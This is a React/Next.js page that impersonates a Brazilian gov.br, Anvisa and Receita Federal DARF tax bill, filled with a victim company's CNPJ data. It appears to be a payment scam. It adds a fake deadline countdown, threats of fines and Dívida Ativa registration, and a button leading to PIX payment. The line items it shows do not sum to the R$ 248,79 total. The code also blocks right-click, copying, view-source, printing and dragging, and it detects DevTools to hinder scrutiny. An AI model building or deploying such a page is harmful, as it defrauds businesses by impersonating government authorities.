"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"

interface CNPJData {
  razao_social: string
  cnpj: string
  situacao: string
  data_abertura: string
  endereco: {
    logradouro: string
    numero: string
    bairro: string
    municipio: string
    uf: string
    cep: string
  }
}

export default function DARFPage() {
  const router = useRouter()
  const [cnpjData, setCnpjData] = useState<CNPJData | null>(null)
  const [countdown, setCountdown] = useState("")
  const [isLoadingPayment, setIsLoadingPayment] = useState(false)

  useEffect(() => {
    const storedCnpjData = sessionStorage.getItem("cnpjData")
    if (!storedCnpjData) {
      router.push("/")
      return
    }

    console.log("[v0] Loaded CNPJ data from session:", JSON.parse(storedCnpjData))
    setCnpjData(JSON.parse(storedCnpjData))

    const updateCountdown = () => {
      const now = new Date().getTime()
      const tomorrow = new Date()
      tomorrow.setDate(tomorrow.getDate() + 1)
      tomorrow.setHours(23, 59, 59, 999)

      const distance = tomorrow.getTime() - now

      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60))
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60))
      const seconds = Math.floor((distance % (1000 * 60)) / 1000)

      setCountdown(
        `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`,
      )
    }

    updateCountdown()
    const interval = setInterval(updateCountdown, 1000)

    const showProtectionNotification = () => {
      // Could add notification logic here if needed
    }

    // Prevent right-click
    const handleContextMenu = (e: Event) => {
      e.preventDefault()
      showProtectionNotification()
      return false
    }

    // Prevent text selection
    const handleSelectStart = (e: Event) => {
      e.preventDefault()
      return false
    }

    // Prevent keyboard shortcuts
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.key === "F12" ||
        (e.ctrlKey &&
          (e.key === "u" || e.key === "s" || e.key === "a" || e.key === "c" || e.key === "v" || e.key === "x"))
      ) {
        e.preventDefault()
        showProtectionNotification()
        return false
      }
    }

    // Prevent drag
    const handleDragStart = (e: Event) => {
      e.preventDefault()
      return false
    }

    // DevTools detection
    const devtools = { open: false, orientation: null }
    const threshold = 160

    const devToolsInterval = setInterval(() => {
      if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
        if (!devtools.open) {
          devtools.open = true
          showProtectionNotification()
        }
      } else {
        devtools.open = false
      }
    }, 500)

    // Add event listeners
    document.addEventListener("contextmenu", handleContextMenu)
    document.addEventListener("selectstart", handleSelectStart)
    document.addEventListener("keydown", handleKeyDown)
    document.addEventListener("dragstart", handleDragStart)

    return () => {
      clearInterval(interval)
      clearInterval(devToolsInterval)
      document.removeEventListener("contextmenu", handleContextMenu)
      document.removeEventListener("selectstart", handleSelectStart)
      document.removeEventListener("keydown", handleKeyDown)
      document.removeEventListener("dragstart", handleDragStart)
    }
  }, [router])

  const handleGeneratePIX = () => {
    router.push("/payment")
  }

  if (!cnpjData) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <>
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body { 
            font-family: 'Inter', sans-serif; 
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        .glass-effect {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .gradient-bg {
            background: linear-gradient(135deg, #3b82f6 0%, #1e40af 100%);
        }
        
        .document-bg {
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
        }
        
        .slide-in {
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .pulse-dot {
            animation: pulseDot 2s infinite;
        }
        
        @keyframes pulseDot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.1); }
        }
        
        .notification {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 20px 30px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            z-index: 10000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        
        .notification.show {
            opacity: 1;
            visibility: visible;
        }
        
        .document-shadow {
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        
        .value-highlight {
            background: linear-gradient(45deg, #ef4444, #dc2626);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }
        
        @media print {
            body * { display: none !important; }
            body::after { 
                content: "Você não tem permissão para imprimir esta página. Obrigado.";
                display: block !important;
                text-align: center;
                font-size: 20px;
                margin-top: 50px;
            }
        }
        
        .floating-label {
            transform: translateY(-6px);
            font-size: 0.65rem;
            color: #6b7280;
        }
        
        .darf-border {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            position: relative;
        }
        
        .darf-border::before {
            content: '';
            position: absolute;
            top: -1px;
            left: -1px;
            right: -1px;
            bottom: -1px;
            background: linear-gradient(45deg, #3b82f6, #8b5cf6, #06b6d4);
            border-radius: 8px;
            z-index: -1;
            opacity: 0.1;
        }
      `}</style>

      <div className="min-h-screen bg-gray-50" style={{ scrollBehavior: "smooth" }}>
        {/* Header */}
        <header className="glass-effect fixed top-0 left-0 right-0 z-50 border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6">
            <div className="flex items-center justify-between h-12">
              <div className="flex items-center space-x-3">
                <img src="/images/govbr-logo-large-CK1AxAnO.png" alt="gov.br" className="h-6" />
                <div className="hidden sm:block">
                  <h1 className="text-sm font-semibold text-gray-900">Anvisa</h1>
                  <p className="text-xs text-gray-600">Ministério da Saúde</p>
                </div>
              </div>

              <div className="flex items-center space-x-3">
                <button className="p-1 text-gray-600 hover:text-gray-900 relative">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    className="w-4 h-4"
                  >
                    <path d="M10.268 21a2 2 0 0 0 3.464 0"></path>
                    <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326"></path>
                  </svg>
                  <span className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full pulse-dot"></span>
                </button>
                <div className="text-right hidden md:block">
                  <p className="text-xs font-medium text-gray-900">{cnpjData?.razao_social || "CARREGANDO..."}</p>
                  <p className="text-xs text-gray-600">CNPJ: {cnpjData?.cnpj || ""}</p>
                </div>
                <div className="w-8 h-8 rounded-full gradient-bg flex items-center justify-center text-white font-semibold text-sm">
                  {cnpjData?.razao_social?.charAt(0) || "U"}
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Status Banner */}
        <div className="gradient-bg text-white py-2 fixed top-12 left-0 right-0 z-40">
          <div className="max-w-7xl mx-auto px-4 sm:px-6">
            <div className="flex items-center justify-center space-x-2">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="w-4 h-4"
              >
                <path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V7Z"></path>
                <path d="M14 2v4a2 2 0 0 0 2 2h4"></path>
                <path d="M10 9H8"></path>
                <path d="M16 13H8"></path>
                <path d="M16 17H8"></path>
              </svg>
              <span className="font-semibold text-sm">DARF - Documento de Arrecadação de Receitas Federais</span>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <main className="pt-24 sm:pt-24 pt-28 pb-16 px-4 sm:px-6">
          <div className="max-w-4xl mx-auto">
            {/* DARF Document */}
            <div className="darf-border bg-white document-shadow slide-in">
              {/* Document Header */}
              <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-3 rounded-t-lg">
                <div className="flex items-center justify-between">
                  <div>
                    <h1 className="text-lg font-bold mb-1">DARF</h1>
                    <p className="text-blue-100 text-xs">Documento de Arrecadação de Receitas Federais</p>
                  </div>
                  <div className="text-right">
                    <div className="bg-blue-600 text-white rounded p-2">
                      <p className="text-xs">Protocolo</p>
                      <p className="text-sm font-bold">RF508082</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Document Content */}
              <div className="p-4">
                {/* Personal Information */}
                <div className="grid md:grid-cols-2 gap-3 mb-4">
                  <div className="space-y-2">
                    <div className="relative">
                      <label className="floating-label absolute -top-1 left-2 bg-white px-1">
                        Nome do Contribuinte
                      </label>
                      <div className="border border-gray-200 rounded p-2 bg-gray-50">
                        <p className="font-semibold text-gray-900 text-sm">{cnpjData?.razao_social || ""}</p>
                      </div>
                    </div>

                    <div className="relative">
                      <label className="floating-label absolute -top-1 left-2 bg-white px-1">CNPJ</label>
                      <div className="border border-gray-200 rounded p-2 bg-gray-50">
                        <p className="font-semibold text-gray-900 text-sm">{cnpjData?.cnpj || ""}</p>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <div className="relative">
                      <label className="floating-label absolute -top-1 left-2 bg-white px-1">Período de Apuração</label>
                      <div className="border border-gray-200 rounded p-2 bg-gray-50">
                        <p className="font-semibold text-gray-900 text-sm">18/11/2024</p>
                      </div>
                    </div>

                    <div className="relative">
                      <label className="floating-label absolute -top-1 left-2 bg-white px-1">Data de Vencimento</label>
                      <div className="border border-red-200 rounded p-2 bg-red-50">
                        <p className="font-semibold text-red-700 text-sm">03/10/2025</p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Tax Information */}
                <div className="grid md:grid-cols-2 gap-3 mb-4">
                  <div className="relative">
                    <label className="floating-label absolute -top-1 left-2 bg-white px-1">Código da Receita</label>
                    <div className="border border-gray-200 rounded p-2 bg-gray-50">
                      <p className="font-semibold text-gray-900 text-sm">5952</p>
                    </div>
                  </div>

                  <div className="relative">
                    <label className="floating-label absolute -top-1 left-2 bg-white px-1">Número de Referência</label>
                    <div className="border border-gray-200 rounded p-2 bg-gray-50">
                      <p className="font-semibold text-gray-900 text-sm">RF508082</p>
                    </div>
                  </div>
                </div>

                {/* Values Table */}
                <div className="bg-gradient-to-r from-gray-50 to-gray-100 rounded-lg p-3 mb-4">
                  <h3 className="text-sm font-bold text-gray-900 mb-3 flex items-center">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="w-4 h-4 mr-2 text-blue-600"
                    >
                      <rect width="16" height="20" x="4" y="2" rx="2"></rect>
                      <line x1="8" x2="16" y1="6" y2="6"></line>
                      <line x1="16" x2="16" y1="14" y2="18"></line>
                      <path d="M16 10h.01"></path>
                      <path d="M12 10h.01"></path>
                      <path d="M8 10h.01"></path>
                      <path d="M12 14h.01"></path>
                      <path d="M8 14h.01"></path>
                      <path d="M12 18h.01"></path>
                      <path d="M8 18h.01"></path>
                    </svg>
                    Discriminação dos Valores
                  </h3>

                  <div className="space-y-2">
                    <div className="flex justify-between items-center p-2 bg-white rounded shadow-sm">
                      <span className="font-medium text-gray-700 text-sm">Valor Principal</span>
                      <span className="text-sm font-bold text-gray-900">R$ 0,33</span>
                    </div>

                    <div className="flex justify-between items-center p-2 bg-white rounded shadow-sm">
                      <span className="font-medium text-gray-700 text-sm">Multa</span>
                      <span className="text-sm font-bold text-orange-600">R$ 0,34</span>
                    </div>

                    <div className="flex justify-between items-center p-2 bg-white rounded shadow-sm">
                      <span className="font-medium text-gray-700 text-sm">Juros</span>
                      <span className="text-sm font-bold text-orange-600">R$ 0,33</span>
                    </div>

                    <div className="flex justify-between items-center p-2 bg-gradient-to-r from-green-50 to-blue-50 rounded shadow-sm border-t-2 border-blue-400">
                      <span className="font-bold text-blue-800 text-sm">VALOR A PAGAR</span>
                      <span className="text-lg font-bold text-blue-800">R$ 248,79</span>
                    </div>
                  </div>
                </div>

                {/* Warning Section */}
                <div className="bg-gradient-to-r from-amber-50 to-orange-50 border border-amber-200 rounded-lg p-3 mb-3">
                  <div className="flex items-start space-x-3">
                    <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        className="w-4 h-4 text-amber-600"
                      >
                        <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"></path>
                        <path d="M12 9v4"></path>
                        <path d="M12 17h.01"></path>
                      </svg>
                    </div>
                    <div className="flex-1">
                      <h4 className="text-sm font-bold text-amber-800 mb-2">
                        Atenção: O não pagamento até a data de vencimento resultará em:
                      </h4>
                      <div className="space-y-1 text-amber-700 text-xs">
                        <div className="flex items-center space-x-1">
                          <span>•</span>
                          <span>
                            Acréscimo de multa de <strong>20%</strong> sobre o valor total
                          </span>
                        </div>
                        <div className="flex items-center space-x-1">
                          <span>•</span>
                          <span>
                            Juros de mora calculados com base na <strong>taxa SELIC</strong>
                          </span>
                        </div>
                        <div className="flex items-center space-x-1">
                          <span>•</span>
                          <span>
                            Inscrição em <strong>Dívida Ativa da União</strong>
                          </span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Authentication Code */}
                <div className="text-center py-3 border-t border-gray-200">
                  <p className="text-xs text-gray-500 mb-1">Documento gerado eletronicamente</p>
                  <div className="inline-flex items-center space-x-2 bg-gray-100 rounded px-3 py-1">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="w-3 h-3 text-green-600"
                    >
                      <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
                      <path d="m9 12 2 2 4-4"></path>
                    </svg>
                    <span className="text-xs font-medium text-gray-700">Código de Autenticação: HNaTR%YJmc</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Fixed Action Button */}
        <div className="fixed bottom-0 left-0 right-0 p-3 bg-white border-t shadow-lg">
          <div className="max-w-4xl mx-auto">
            <button
              onClick={handleGeneratePIX}
              className="w-full bg-gradient-to-r from-green-600 to-blue-600 text-white font-bold py-3 px-6 rounded-xl text-sm hover:from-green-700 hover:to-blue-700 transition-all duration-300 transform hover:scale-105 shadow-lg flex items-center justify-center space-x-2"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="w-5 h-5"
              >
                <rect width="20" height="14" x="2" y="5" rx="2"></rect>
                <line x1="2" x2="22" y1="10" y2="10"></line>
              </svg>
              <span>GERAR DARF DE PAGAMENTO</span>
            </button>
          </div>
        </div>
      </div>
    </>
  )
}
